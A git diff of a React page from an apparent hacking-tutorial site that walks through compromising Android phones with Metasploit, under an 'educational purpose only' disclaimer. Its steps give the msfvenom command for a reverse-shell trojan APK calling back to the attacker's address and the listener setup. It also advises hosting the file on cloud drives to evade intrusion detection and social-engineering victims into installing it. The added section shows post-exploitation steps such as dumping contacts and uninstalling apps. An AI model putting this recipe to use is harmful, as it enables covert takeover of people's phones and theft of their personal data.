@@ -46,224 +46,310 @@ export default function Payload() {
       </div>
 
       <div className="mx-auto max-w-7xl ">
-              {/* Disclaimer */}
-              <div className="text-white space-y-5 px-2 my-10 lg:my-10 lg:px-48 ">
-                <h1 className="font-handjet text-red-500 text-3xl md:text-5xl text-center">
-                  Disclaimer: Educational Purpose Only
-                </h1>
-                <p className="font-ibm text-red-500 text-xs px-2 font-semibold">
-                  The tools provided herein are intended solely for educational
-                  purposes. Users are reminded that any utilization of these tools in
-                  any other context, including but not limited to commercial,
-                  professional, or non-educational settings, is strictly prohibited.
-                  The creators and distributors of these tools do not endorse or
-                  encourage any misuse, unauthorized access, or any activities that
-                  violate applicable laws or regulations.
-                </p>
-              </div>
+        {/* Disclaimer */}
+        <div className="text-white space-y-5 px-2 my-10 lg:my-10 lg:px-48 ">
+          <h1 className="font-handjet text-red-500 text-3xl md:text-5xl text-center">
+            Disclaimer: Educational Purpose Only
+          </h1>
+          <p className="font-ibm text-red-500 text-xs px-2 font-semibold">
+            The tools provided herein are intended solely for educational
+            purposes. Users are reminded that any utilization of these tools in
+            any other context, including but not limited to commercial,
+            professional, or non-educational settings, is strictly prohibited.
+            The creators and distributors of these tools do not endorse or
+            encourage any misuse, unauthorized access, or any activities that
+            violate applicable laws or regulations.
+          </p>
+        </div>
 
-              {/* Generating the payload */}
-              {/* Step 1 */}
-              <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
-                <h1 className="font-juli text-3xl md:text-5xl">
-                  Generating the payload
-                </h1>
-                <h1 className="font-juli text-3xl md:text-5xl">Step 1:</h1>
-                <h2 className="uppercase font-juli text-sm lg:text-2xl">
-                  Type “ifconfig” into the terminal session in order to view the
-                  network interface configuration of the device we are using to
-                  execute the attack.
-                </h2>
-                <Terminal text="ifconfig"></Terminal>
-                <img src={a1} alt="terminal" className="my-5 md:max-w-2xl" />
+        {/* Generating the payload */}
+        {/* Step 1 */}
+        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
+          <h1 className="font-juli text-3xl md:text-5xl">
+            Generating the payload
+          </h1>
+          <h1 className="font-juli text-3xl md:text-5xl">Step 1:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            Type “ifconfig” into the terminal session in order to view the
+            network interface configuration of the device we are using to
+            execute the attack.
+          </h2>
+          <Terminal text="ifconfig"></Terminal>
+          <img src={a1} alt="terminal" className="my-5 md:max-w-2xl" />
 
-                <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
-                  <span className="text-red-500">Here :</span> <br />
-                  1. eth0 is the First Ethernet interface (Consists of ‘inet’ which
-                  shows the IP(Internet Protocol) address of our attacking machine).{" "}
-                  <br />
-                  2. lo is the Loopback interface.
-                </h2>
-                <h2 className="uppercase font-juli text-sm lg:text-2xl">
-                  After getting your interface IP address, we will use msfvenom that
-                  will produce a payload to infiltrate the Android OS.
-                </h2>
-              </div>
-              {/* Step 2 */}
-              <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
-                <h1 className="font-juli text-3xl md:text-5xl">Step 2:</h1>
-                <h2 className="uppercase font-juli text-sm lg:text-2xl">
-                  Listing all the accessible choices with msfvenom. (This will list
-                  down all the boundaries that will assist us with producing our
-                  payload).
-                </h2>
-                <Terminal text="msfvenom -h"></Terminal>
-                <img src={a2} alt="terminal" className="my-5 md:max-w-2xl" />
+          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
+            <span className="text-red-500">Here :</span> <br />
+            1. eth0 is the First Ethernet interface (Consists of ‘inet’ which
+            shows the IP(Internet Protocol) address of our attacking machine).{" "}
+            <br />
+            2. lo is the Loopback interface.
+          </h2>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            After getting your interface IP address, we will use msfvenom that
+            will produce a payload to infiltrate the Android OS.
+          </h2>
+        </div>
+        {/* Step 2 */}
+        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
+          <h1 className="font-juli text-3xl md:text-5xl">Step 2:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            Listing all the accessible choices with msfvenom. (This will list
+            down all the boundaries that will assist us with producing our
+            payload).
+          </h2>
+          <Terminal text="msfvenom -h"></Terminal>
+          <img src={a2} alt="terminal" className="my-5 md:max-w-2xl" />
 
-                <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
-                  Now, the payload can be saved in ‘.exe’, ‘.msi’, or ‘.apk’, etc.
-                  format, but for this tutorial, we will use ‘.apk’ format as the
-                  victim’s device would an android device which supports ‘.apk‘
-                  extension.
-                </h2>
-              </div>
-              {/* Step 3 */}
-              <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
-                <h1 className="font-juli text-3xl md:text-5xl">Step 3:</h1>
-                <h2 className="uppercase font-juli text-sm lg:text-2xl">
-                  So now we have to create a payload which we may execute on the
-                  victim’s device in order to execute the attack successfully.
-                </h2>
-                <Terminal text="msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.18.63 LPORT=4444 -o androidhack.apk"></Terminal>
-                <img src={a3} alt="terminal" className="my-5 md:max-w-2xl" />
+          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
+            Now, the payload can be saved in ‘.exe’, ‘.msi’, or ‘.apk’, etc.
+            format, but for this tutorial, we will use ‘.apk’ format as the
+            victim’s device would an android device which supports ‘.apk‘
+            extension.
+          </h2>
+        </div>
+        {/* Step 3 */}
+        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
+          <h1 className="font-juli text-3xl md:text-5xl">Step 3:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            So now we have to create a payload which we may execute on the
+            victim’s device in order to execute the attack successfully.
+          </h2>
+          <Terminal text="msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.18.63 LPORT=4444 -o androidhack.apk"></Terminal>
+          <img src={a3} alt="terminal" className="my-5 md:max-w-2xl" />
 
-                <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
-                  <span className="text-red-500">Here :</span> <br /> 1. -p shows the
-                  payload type <br />
-                  2. android/meterpreter/reverse_tcp indicates a reverse meterpreter
-                  shell would roll in from an objective Android gadget. <br />
-                  3. LHOST is our IP i.e attacker’s IP <br />
-                  4. LPORT is the listening port on the attacker’s machine. <br />
-                  5. R{">"} /var/www/html generates the output directly on apache
-                  server <br />
-                  6. ‘.apk’ is the file extension of the Trojan created. <br />
-                  This would set aside some effort(time) to produce an apk document of
-                  around 10,186 bytes.
-                </h2>
-              </div>
-              {/* Setting up the Attack */}
-              {/* Step 1 */}
-              <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
-                <h1 className="font-juli text-3xl md:text-5xl">
-                  Setting up the Attack
-                </h1>
-                <h1 className="font-juli text-3xl md:text-5xl">Step 1:</h1>
-                <h2 className="uppercase font-juli text-sm lg:text-2xl">
-                  Firstly, we need to check the status of the Apache server (Web
-                  Application Server) and to do so enter the following commands in the
-                  terminal
-                </h2>
-                <Terminal text="service apache2 start"></Terminal>
-                <Terminal text="service apache2 status"></Terminal>
-                <img src={a4} alt="terminal" className="my-5 md:max-w-2xl" />
+          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
+            <span className="text-red-500">Here :</span> <br /> 1. -p shows the
+            payload type <br />
+            2. android/meterpreter/reverse_tcp indicates a reverse meterpreter
+            shell would roll in from an objective Android gadget. <br />
+            3. LHOST is our IP i.e attacker’s IP <br />
+            4. LPORT is the listening port on the attacker’s machine. <br />
+            5. R{">"} /var/www/html generates the output directly on apache
+            server <br />
+            6. ‘.apk’ is the file extension of the Trojan created. <br />
+            This would set aside some effort(time) to produce an apk document of
+            around 10,186 bytes.
+          </h2>
+        </div>
+        {/* Setting up the Attack */}
+        {/* Step 1 */}
+        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
+          <h1 className="font-juli text-3xl md:text-5xl">
+            Setting up the Attack
+          </h1>
+          <h1 className="font-juli text-3xl md:text-5xl">Step 1:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            Firstly, we need to check the status of the Apache server (Web
+            Application Server) and to do so enter the following commands in the
+            terminal
+          </h2>
+          <Terminal text="service apache2 start"></Terminal>
+          <Terminal text="service apache2 status"></Terminal>
+          <img src={a4} alt="terminal" className="my-5 md:max-w-2xl" />
 
-                <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
-                  We, can use this(apache2) web server in order to host files, or we
-                  can put on Google Drive or Dropbox or any of the cloud providers who
-                  have shared files and then we can put those files on the server, and
-                  then the victims will not be able to detect any malicious intent
-                  because the Network Intrusion Detection System may bypass and say,
-                  Hey! This is a friendly domain we’ll let it go.
-                </h2>
-              </div>
-              {/* Step 2 */}
-              <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
-                <h1 className="font-juli text-3xl md:text-5xl">Step 2:</h1>
-                <h2 className="uppercase font-juli text-sm lg:text-2xl">
-                  Now, all seems to be set up correctly, and we can start the
-                  msfconsole.
-                </h2>
-                <Terminal text="msfconsole"></Terminal>
-                <img src={a5} alt="terminal" className="my-5 md:max-w-2xl" />
-              </div>
-              {/* Step 3 */}
-              <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
-                <h1 className="font-juli text-3xl md:text-5xl">Step 3:</h1>
-                <h2 className="uppercase font-juli text-sm lg:text-2xl">
-                  Use multi/handler exploit, set payload the same as generated
-                  previously(This will help us to generate a listener).
-                </h2>
-                <Terminal text="use multi/handler"></Terminal>
-                <Terminal text="set PAYLOAD android/meterpreter/reverse_tcp"></Terminal>
-                <img src={a6} alt="terminal" className="my-5 md:max-w-2xl" />
-              </div>
-              {/* Step 4 */}
-              <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
-                <h1 className="font-juli text-3xl md:text-5xl">Step 4:</h1>
-                <h2 className="uppercase font-juli text-sm lg:text-2xl">
-                  Now, we will use the ‘show options’ command in order to see the
-                  configuration, set the LHOST(Local Host) and LPORT(Local Port)
-                  values the same as used in the payload (Type the following commands
-                  for the same).
-                </h2>
-                <Terminal text="show options"></Terminal>
-                <img src={a7} alt="terminal" className="my-5 md:max-w-2xl" />
-              </div>
-              {/* Step 5 */}
-              <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
-                <h1 className="font-juli text-3xl md:text-5xl">Step 5:</h1>
-                <h2 className="uppercase font-juli text-sm lg:text-2xl">
-                  Here, the LPORT is already set, so we just need to set the LHOST to
-                  our attacking machine’s IP, and we can do this by the following
-                  command:
-                </h2>
-                <Terminal text="set LHOST 192.168.18.63"></Terminal>
-                <img src={a8} alt="terminal" className="my-5 md:max-w-2xl" />
-              </div>
-              {/* Step 6 */}
+          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
+            We, can use this(apache2) web server in order to host files, or we
+            can put on Google Drive or Dropbox or any of the cloud providers who
+            have shared files and then we can put those files on the server, and
+            then the victims will not be able to detect any malicious intent
+            because the Network Intrusion Detection System may bypass and say,
+            Hey! This is a friendly domain we’ll let it go.
+          </h2>
+        </div>
+        {/* Step 2 */}
+        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
+          <h1 className="font-juli text-3xl md:text-5xl">Step 2:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            Now, all seems to be set up correctly, and we can start the
+            msfconsole.
+          </h2>
+          <Terminal text="msfconsole"></Terminal>
+          <img src={a5} alt="terminal" className="my-5 md:max-w-2xl" />
+        </div>
+        {/* Step 3 */}
+        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
+          <h1 className="font-juli text-3xl md:text-5xl">Step 3:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            Use multi/handler exploit, set payload the same as generated
+            previously(This will help us to generate a listener).
+          </h2>
+          <Terminal text="use multi/handler"></Terminal>
+          <Terminal text="set PAYLOAD android/meterpreter/reverse_tcp"></Terminal>
+          <img src={a6} alt="terminal" className="my-5 md:max-w-2xl" />
+        </div>
+        {/* Step 4 */}
+        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
+          <h1 className="font-juli text-3xl md:text-5xl">Step 4:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            Now, we will use the ‘show options’ command in order to see the
+            configuration, set the LHOST(Local Host) and LPORT(Local Port)
+            values the same as used in the payload (Type the following commands
+            for the same).
+          </h2>
+          <Terminal text="show options"></Terminal>
+          <img src={a7} alt="terminal" className="my-5 md:max-w-2xl" />
+        </div>
+        {/* Step 5 */}
+        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
+          <h1 className="font-juli text-3xl md:text-5xl">Step 5:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            Here, the LPORT is already set, so we just need to set the LHOST to
+            our attacking machine’s IP, and we can do this by the following
+            command:
+          </h2>
+          <Terminal text="set LHOST 192.168.18.63"></Terminal>
+          <img src={a8} alt="terminal" className="my-5 md:max-w-2xl" />
+        </div>
+        {/* Step 6 */}
 
-              <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
-                <h1 className="font-juli text-3xl md:text-5xl">Step 6:</h1>
-                <h2 className="uppercase font-juli text-sm lg:text-2xl">
-                  Now, we can type ‘exploit’ in order to launch the desired attack.
-                </h2>
-                <Terminal text="exploit"></Terminal>
-                <img src={a9} alt="terminal" className="my-5 md:max-w-2xl" />
+        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
+          <h1 className="font-juli text-3xl md:text-5xl">Step 6:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            Now, we can type ‘exploit’ in order to launch the desired attack.
+          </h2>
+          <Terminal text="exploit"></Terminal>
+          <img src={a9} alt="terminal" className="my-5 md:max-w-2xl" />
 
-                <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
-                  So, once we execute the ‘exploit‘ command, the TCP handler starts
-                  immediately. In real-life scenarios, some social engineering
-                  procedures can be utilized to let the objective download the
-                  vindictive ‘.apk’ file. For the tutorial purpose, we are simply
-                  making the victim machine download the file in the Android Phone.
-                </h2>
-              </div>
+          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
+            So, once we execute the ‘exploit‘ command, the TCP handler starts
+            immediately. In real-life scenarios, some social engineering
+            procedures can be utilized to let the objective download the
+            vindictive ‘.apk’ file. For the tutorial purpose, we are simply
+            making the victim machine download the file in the Android Phone.
+          </h2>
+        </div>
 
-              {/* Executing the attack Exploitation:*/}
-              {/* Step 1 and 2 */}
-              <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
-                <h1 className="font-juli text-3xl md:text-5xl">
-                  Executing the attack Exploitation:
-                </h1>
-                <h1 className="font-juli text-3xl md:text-5xl">Step 1:</h1>
-                <h2 className="uppercase font-juli text-sm lg:text-2xl">
-                  Type the following web address in a web browser on the victim’s
-                  phone
-                </h2>
-                <h1 className="text-white">
-                  {
-                    "(<IP address of the attacker's machine>/<name of the trojan created earlier>.apk)"
-                  }
-                </h1>
-                <h1>Example in this case:</h1>
-                <Terminal text="192.168.18.63/androidhack.apk"></Terminal>
-                <h1 className="font-juli text-3xl md:text-5xl">Step 2:</h1>
-                <h2 className="uppercase font-juli text-sm lg:text-2xl">
-                  After downloading the payload successfully, we have to select the
-                  app to install.
-                </h2>
-                <img src={a10} alt="terminal" className="my-5 md:max-w-sm" />
-                <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
-                  Up until now, this alternative has been seen regularly when we
-                  attempt to introduce some outsider applications, and ordinarily,
-                  clients won’t falter to permit the application from obscure sources.
-                </h2>
-              </div>
+        {/* Executing the attack Exploitation:*/}
+        {/* Step 1 and 2 */}
+        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
+          <h1 className="font-juli text-3xl md:text-5xl">
+            Executing the attack Exploitation:
+          </h1>
+          <h1 className="font-juli text-3xl md:text-5xl">Step 1:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            Type the following web address in a web browser on the victim’s
+            phone
+          </h2>
+          <h1 className="text-white">
+            {
+              "(<IP address of the attacker's machine>/<name of the trojan created earlier>.apk)"
+            }
+          </h1>
+          <h1>Example in this case:</h1>
+          <Terminal text="192.168.18.63/androidhack.apk"></Terminal>
+          <h1 className="font-juli text-3xl md:text-5xl">Step 2:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            After downloading the payload successfully, we have to select the
+            app to install.
+          </h2>
+          <img src={a10} alt="terminal" className="my-5 md:max-w-sm" />
+          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
+            Up until now, this alternative has been seen regularly when we
+            attempt to introduce some outsider applications, and ordinarily,
+            clients won’t falter to permit the application from obscure sources.
+          </h2>
+        </div>
 
-              {/* Step 3*/}
-              <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
-                <h1 className="font-juli text-3xl md:text-5xl">Step 3:</h1>
-                <h2 className="uppercase font-juli text-sm lg:text-2xl">
-                  Enable the settings to introduce applications from outside sources.
-                  Lastly hit the install choice at the base.
-                </h2>
-                <img src={a11} alt="terminal" className="my-5 md:max-w-sm" />
-                <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
-                  Once the victim installs the application and runs it, the
-                  meterpreter session would be opened immediately at the attacker’s
-                  terminal.
-                </h2>
-              </div>
+        {/* Step 3*/}
+        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
+          <h1 className="font-juli text-3xl md:text-5xl">Step 3:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            Enable the settings to introduce applications from outside sources.
+            Lastly hit the install choice at the base.
+          </h2>
+          <img src={a11} alt="terminal" className="my-5 md:max-w-sm" />
+          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
+            Once the victim installs the application and runs it, the
+            meterpreter session would be opened immediately at the attacker’s
+            terminal.
+          </h2>
+        </div>
+
+        {/* Post Exploitation::*/}
+        {/* Step 1 */}
+        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
+          <h1 className="font-juli text-3xl md:text-5xl">Step 1:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            Type “background” and then “sessions” to list down all the sessions
+            from where you can see all the IPs connected to the machine.
+          </h2>
+          <Terminal text="sessions"></Terminal>
+          <img src={a12} alt="terminal" className="my-5 md:max-w-sm" />
+        </div>
+
+        {/* Step 2 */}
+        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
+          <h1 className="font-juli text-3xl md:text-5xl">Step 2:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            You can interact with any session by typing the following command:
+          </h2>
+          <Terminal text="  sessions -i [session ID]"></Terminal>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            After entering the session, type “help” to list down all the
+            commands we can put forward in this session. You can see some file
+            system commands that are useful when you’re attempting to pursue
+            some touchy data or information. By utilizing these, You can
+            undoubtedly download or transfer any document or data.
+          </h2>
+          <Terminal text="help"></Terminal>
+          <img src={a13} alt="terminal" className="my-5 md:max-w-sm" />
+        </div>
+
+        {/* Step 3 & 4 */}
+        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
+          <h1 className="font-juli text-3xl md:text-5xl">Step 3:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            Type the following command in order to see all the apps which are
+            installed on the particular Android OS.
+          </h2>
+          <Terminal text="app_list"></Terminal>
+          <h1 className="font-juli text-3xl md:text-5xl">Step 5:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            We can also uninstall any app from the Android device.
+          </h2>
+          <img src={a14} alt="terminal" className="my-5 md:max-w-sm" />
+        </div>
+
+        {/* Step 5 */}
+        <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
+          <h1 className="font-juli text-3xl md:text-5xl">Step 5:</h1>
+          <h2 className="uppercase font-juli text-sm lg:text-2xl">
+            Now let us extract some contacts from the target device by typing
+            “dump” and double tab. It will show all the choices to extricate
+            from the device. Type “dump_contacts” and enter. It will separate
+            all the contacts from the Android gadget and will spare it in our
+            local directory. To see this document type “ls” and “cat
+            [file_name]”
+          </h2>
+          <Terminal text=" dump_contacts"></Terminal>
+          <img src={a15} alt="terminal" className="my-5 md:max-w-sm" />
+          <h2 className="font-lec font-bold text-[#00FF19] text-sm lg:text-2xl">
+            You can send any of the links to the victim. Once he/she entered
+            his/her id password it will get reflected in the terminal. This
+            would show the content of the contact’s file earlier downloaded from
+            the target device. This information is really sensitive and could be
+            exploited by hackers. There are loads of more commands available in
+            meterpreter. Further, attempt to investigate and realize what we can
+            perform with an Android gadget. This reason we have effectively
+            entered the Android gadget utilizing Kali Linux and
+            Metasploit-Framework. A sound tip to make sure about your Android
+            gadget is to not introduce any application from an obscure source,
+            regardless of whether you truly need to introduce it, attempt to
+            peruse, and look at its source code to get a thought whether this
+            file is malevolent or not.
+          </h2>
+          <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
+            <span className="text-red-500">Note :</span> <br />
+            The above tutorial can be successfully implemented in the case of an
+            android 8.0 or lesser version. <br />
+            This tutorial is made in order to give the community a basic idea of
+            how the hackers get into our personal gadgets, and the above method
+            is the most basic one i.e by firstly creating an android payload by
+            msfvenom and then exploiting it using the Metasploit-framework as it
+            is delivered using various social engineering techniques onto the
+            victim’s phone.
+          </h2>
+        </div>
       </div>
 
       <Footer></Footer>
